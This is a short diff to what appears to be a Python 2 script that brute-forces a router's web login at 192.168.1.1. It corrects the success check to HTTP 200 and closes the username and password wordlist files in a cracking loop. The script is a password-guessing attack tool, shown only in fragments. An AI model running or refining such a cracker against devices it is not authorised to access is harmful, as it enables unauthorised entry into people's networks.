@@ -42,7 +42,7 @@ def new_login(password):
     requests.get('http://192.168.1.1', headers={'Content-Type': 'application/json'})
     r = requests.post('http://192.168.1.1', json={"method": "do", "login": {"password": security_encode(password)}})
     print 'trying `%s`...%d' % (password, r.status_code)
-    if r.status_code == 401:
+    if r.status_code == 200:
         return True, 'the password is %s' % password
     else:
         return False, -1
@@ -90,7 +90,8 @@ def old_crack():
                     result, msg = old_login(username.rstrip('\n'), password.rstrip('\n'))
                     if result:
                         return msg
-
+    f1.close()
+    f2.close()
 
 def test_security_encode():
     assert '0KcgeXhc9TefbwK' == security_encode('123456')
